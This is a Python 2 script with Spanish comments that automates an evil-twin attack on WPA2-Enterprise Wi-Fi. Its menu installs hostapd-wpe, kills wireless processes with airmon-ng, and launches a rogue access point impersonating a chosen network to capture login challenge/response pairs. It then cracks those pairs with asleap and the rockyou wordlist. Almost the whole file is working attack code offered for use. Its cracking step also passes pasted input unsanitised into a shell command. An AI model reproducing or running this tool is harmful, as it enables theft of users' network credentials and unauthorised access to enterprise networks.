#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import subprocess
import sys
import time

os.system("clear")
print "Attack redes Wifi WPA2 Enterprise"

uso = """
***********************************************************************
*                              Twitter : @Yonatan_correa              *
*    *** Modo de uso ***                                              *
*                                                                     *
*    Primero configurar el archivo hostapd.conf coloca el nombre de   *
*    la red que quieres suplantar                                     *
*                                                                     *
*    Si ya esta todo listo escribe:                                   *
*                                                                     *
*                            python hostapd.py run                    *
***********************************************************************
"""

if len(sys.argv) !=2:
    print uso
    sys.exit(0)

def instalacionhostapd():

    instalresult = os.system("apt-get install hostapd-wpe")
    print instalresult

def ejecutarairmon():

    #mata los procesos de la wlan
    airm = "airmon-ng check kill"
    airmresult = subprocess.check_output(airm, shell=True)
    print "Airmon ya se Ejecutado \n"
    time.sleep(2)

def ejecutarhostapd():

    hostapdrun = os.system("gnome-terminal -e 'bash -c \"hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf; exec bash\"'")
    print hostapdrun

def sacarpasswd():

    chanllenge = raw_input("\n Ahora pega el challenge: ")
    response = raw_input("Ahora pega el response: ")

    zcatpro = os.system("zcat /usr/share/wordlists/rockyou.txt.gz | asleap -C " + chanllenge + " -R " + response + " -W -")
    print zcatpro
    time.sleep(5)
    os.system("clear")

def main():


    while True:
        print "\n"

        opciones = """
        *************************************************************
        **    1- Instalar el hostapd-wpe                           **
        **    2- Ejecutar el airmon y matar los proceso de la wlan **
        **    3- Ejecutar el hostapd en otra terminal              **
        **    4- Ejecutar la opcion para crack la contraseña       **
        **    5- Salir                                             **
        **                              Twitter : @Yonatan_correa  **
        *************************************************************
        """
        print opciones

        opcion = raw_input(" ")

        if opcion == "1":
            instalacionhostapd()
            os.system("clear")

        elif opcion == "2":
            ejecutarairmon()
            os.system("clear")

        elif opcion == "3":
            ejecutarhostapd()
            os.system("clear")

        elif opcion == "4":
            sacarpasswd()

        elif opcion == "5":
            os.system("/etc/init.d/network-manager restart")
            sys.exit()

        else:
            os.system("clear")
            print "La opcion ingresada no existe"
            time.sleep(2)

main()
